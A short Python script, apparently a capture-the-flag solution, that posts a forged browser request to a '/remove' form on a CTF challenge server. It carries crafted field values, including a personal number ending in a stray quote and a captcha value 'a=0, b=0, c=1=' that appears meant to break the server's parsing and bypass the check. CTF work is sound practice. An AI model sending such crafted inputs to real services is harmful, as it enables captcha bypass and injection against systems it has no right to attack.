import requests

url = "https://voiceofnature.ctfchall.se:50000/remove"

headers = {
    "Host": "voiceofnature.ctfchall.se:50000",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Accept-Language": "en-GB,en;q=0.9",
    "Origin": "https://voiceofnature.ctfchall.se:50000",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://voiceofnature.ctfchall.se:50000/remove",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
    "Connection": "keep-alive",
}

data = {
    "full-legal-name": "123123",
    "date-of-birth": "12312312",
    "personalnumber": "124312-1234-\"",
    "swedish-citizen": "on",
    "tome-untill-readd": "0",
    "i-am-sure": "on",
    "read-thoroughly": "on",
    "captcha": "a=0, b=0, c=1="
}

response = requests.post(url, headers=headers, data=data)

print("Status Code:", response.status_code)
print("Response Text:", response.text)
